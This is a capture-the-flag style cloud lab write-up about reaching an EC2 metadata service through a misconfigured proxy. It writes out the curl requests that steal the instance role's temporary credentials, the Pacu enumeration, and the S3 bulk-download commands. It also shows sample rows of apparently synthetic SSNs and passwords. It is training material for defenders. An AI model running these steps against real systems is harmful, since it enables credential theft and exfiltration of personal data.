# Challenge Lab Name: `S3 Data Exfiltration via EC2 IMDSv1`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://cybr.com" target="_blank" title="Open Cybr Labs Platform"><img src="https://img.shields.io/badge/Cybr_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Cybr Labs Platform Link"></a> &nbsp;
>
>A company runs an EC2 instance behind a web proxy. The proxy is misconfigured and lets outside requests reach the instance metadata service. Your job is to reach that metadata service, steal the instance role's temporary credentials, and use them to download the sensitive cardholder data from the company's S3 bucket.

</details>


<details open>
<summary><b>Initial Access & Enumeration</b></summary>

The initial access given was an EC2 website URL. 

```
http://3.237.86.91
```

When trying to access the website on a browser I was getting an error, so the next thing I did was run the command below. 

```bash
└─$ curl -i http://3.237.86.91                                                   
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Nov 2026 17:57:17 GMT
Content-Type: application/octet-stream
Content-Length: 139
Connection: keep-alive

<h1>This server is configured to proxy requests to the EC2 metadata service. Please modify your request's 'host' header and try again.</h1>
```

From the `curl` command output I could see that the server was running and responding. I also had a few new findings from the output:
1. The web server was acting as a proxy to make requests to the EC2 metadata service.
2. The web server was expecting the **host** header. 

To test out this EC2's purpose I added the **host** header with the IPv4 address of the [instance metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html), `169.254.169.254`, and then changed the URL path to include the instance metadata categories by adding `latest/meta-data/` at the end. So the command turned out like `curl -i http://3.237.86.91/latest/meta-data/ -H "host: 169.254.169.254"`.

With a successful return from the command I went ahead and included the URL path that would list any IAM roles associated with the EC2 instance. From this AWS Documentation [page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) I could see including `iam/security-credentials/` would do the trick. 

I then went ahead and ran the command below, where I saw that there was the role **cg-banking-Role** associated with the EC2 instance. 

```bash
└─$ curl -i http://3.237.86.91/latest/meta-data/iam/security-credentials/ -H "host: 169.254.169.254"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Nov 2026 18:07:02 GMT
Content-Type: text/plain
Content-Length: 15
Connection: keep-alive
Accept-Ranges: none
Last-Modified: Mon, 23 Nov 2026 17:52:33 GMT

cg-banking-Role
```

With this information I went ahead and ran the command below, which output temporary credentials for the IAM role **cg-banking-Role** that I could use.

```bash
└─$ curl -i http://3.237.86.91/latest/meta-data/iam/security-credentials/cg-banking-Role -H "host: 169.254.169.254"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Nov 2026 18:07:44 GMT
Content-Type: text/plain
Content-Length: 1582
Connection: keep-alive
Accept-Ranges: none
Last-Modified: Mon, 23 Nov 2026 17:52:33 GMT

{
  "Code" : "Success",
  "LastUpdated" : "2026-11-23T17:52:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA********T5",
  "SecretAccessKey" : "+2***************vPS",
  "Token" : "IQo********************************ResnhA=",
  "Expiration" : "2026-11-24T00:27:36Z"
} 
```

</details>


<details open>
<summary><b>Privilege Escalation & S3 Sensitive Data Extraction</b></summary>

Using the temporary credentials I created an AWS profile called **cg-bank** by running `aws configure --profile cg-bank`. I also used the default region of **us-east-1** and the default output format as **json**. Then running the command below I could see the assumed role, the ARN, and the Account ID that it was attached to. 

```bash
└─$ aws sts get-caller-identity --profile cg-bank        
{
    "UserId": "AROAYSQ3WBVX346DH2L26:i-0502f901da13c75ae",
    "Account": "589542329711",
    "Arn": "arn:aws:sts::589542329711:assumed-role/cg-banking-Role/i-0502f901da13c75ae"
}
```

Originally I tried finding permissions that the role had by running, with the AWS profile, `aws iam list-attached-role-policies --role-name cg-banking-Role` and `aws iam list-role-policies --role-name cg-banking-Role`but I got an `AccessDenied` error for both. This is when I decided to automate the process of finding the role's permissions with [Pacu](https://github.com/RhinoSecurityLabs/pacu), an AWS exploitation framwork. 


Once I created a Pacu session named **cg-bank** I went ahead and imported the initial access credentials stored in my AWS profile by running the command below.  

```bash
Pacu (cg-bank:No Keys Set) > import_keys cg-bank
  Imported keys as "imported-cg-bank"
Pacu (cg-bank:imported-cg-bank) > 
```

After my credentials were imported I ran the **iam__bruteforce_permissions** module to find what API calls could be made with the IAM role I had. Once the module completed I ran `whoami` to see a summary of the permissions found. 

```bash
Pacu (cg-bank:imported-cg-bank) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
...
...
Pacu (cg-bank:imported-cg-bank) > whoami
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
...
...
  "Permissions": {
    "Allow": [
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "s3:ListBuckets"
    ],
    "Deny": []
  }
}
```

One particular action I was allowed to use with the IAM role was listing S3 buckets that were in the AWS account. In Pacu, I was able to list the buckets by running the command below, and then view the full information by running `data s3` when the module completed. 

```bash
Pacu (cg-bank:imported-cg-bank) > run s3__download_bucket --names-only
  Running module s3__download_bucket...
[s3__download_bucket] Enumerating buckets...
[s3__download_bucket]   Found bucket "cg-cardholder-data-bucket-589542329711"
[s3__download_bucket] Starting enumerating objects in buckets...
[s3__download_bucket] Finished enumerating objects in buckets...
[s3__download_bucket]   Writing file names to disk...
[s3__download_bucket] s3__download_bucket completed.

[s3__download_bucket] MODULE SUMMARY:

  1 total buckets found.
  1 buckets found with read permissions.

Pacu (cg-bank:imported-cg-bank) > data s3
{
  "Buckets": [
    {
      "BucketArn": "arn:aws:s3:::cg-cardholder-data-bucket-589542329711",
      "CreationDate": "Mon, 23 Nov 2026 17:52:24",
      "Name": "cg-cardholder-data-bucket-589542329711"
    }
  ]
}
```

To view what objects were inside the bucket **cg-cardholder-data-bucket-589542329711** I used the AWS CLI and ran the command below. 

```bash
└─$ aws s3 ls s3://cg-cardholder-data-bucket-589542329711 --profile cg-bank      
2026-11-23 09:52:25      58872 cardholder_data_primary.csv
2026-11-23 09:52:25      59384 cardholder_data_secondary.csv
2026-11-23 09:52:25      92165 cardholders_corporate.csv
```

From the output I could see that there were a few objects, and based off the filenames they most likely contained sensitive customer data. To download all these files in one-go I ran the command below. The `--recursive` flag letting AWS know to download file after file onto my local machine. 

```bash
└─$ aws s3 cp s3://cg-cardholder-data-bucket-589542329711 . --recursive  --profile cg-bank
download: s3://cg-cardholder-data-bucket-589542329711/cardholder_data_primary.csv to ./cardholder_data_primary.csv
download: s3://cg-cardholder-data-bucket-589542329711/cardholder_data_secondary.csv to ./cardholder_data_secondary.csv
download: s3://cg-cardholder-data-bucket-589542329711/cardholders_corporate.csv to ./cardholders_corporate.csv
```

Now with the files on my local machine, I opened both the `cardholder_data_primary.csv` and `cardholder_data_secondary.csv` file in LibreOffice. They both contained sensitive customer information. I also checked the `cardholders_corporate.csv` file using the Linux CLI, and could see that the file contained the same formatting and type of information as the other two files. 

```bash
└─$ cat cardholders_corporate.csv | head -n 5
id,SSN,Corporate Account,first_name,last_name,password,email,gender,ip_address
1,387-31-4447,Skyba,Earle,Gathwaite,A53nIB6g,egathwaite0@edublogs.org,Male,149.213.19.178
2,460-81-1585,JumpXS,Helenelizabeth,Horsey,iGq5eZx,hhorsey1@friendfeed.com,Female,185.239.253.79
3,579-08-7651,Kayveo,Saudra,Adamowicz,AfHq0d6,sadamowicz2@posterous.com,Female,74.193.79.239
4,142-95-7518,Centimia,Renae,Prandini,PO3aGDbmJBir,rprandini3@microsoft.com,Female,239.58.123.127
```

</details>


<details open>
<summary><b>Impact & Reflection</b></summary>

The initial access was a website URL, and after running a few commands in the terminal I was able to extract sensitive customer data. This attack path was possible because of a misconfigured proxy that allowed me to access the instance metadata service for the EC2 instance running. There was an IAM role associated with the EC2 instance, which can be learned about from this AWS documentation [page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html). This specifc role had permission to view S3 buckets in the AWS associated with the AWS account. 

A security recommendation for the misconfigured proxy could be to explicitly block any access to all the metadata instance categories by creating an allowlist for exact paths. Two other security recommendations that could have possibly prevented this attack path from escalating were restricting what S3 buckets were allowed to be viewed by the IAM role and encrypting the files containing sensitive cardholder information with a strong key. This workflow should not exist unless there was an application running on the EC2 instance that needed to access this data, like a payment-related service. PII data should also not be stored in plaintext at rest or in transit. 

</details>
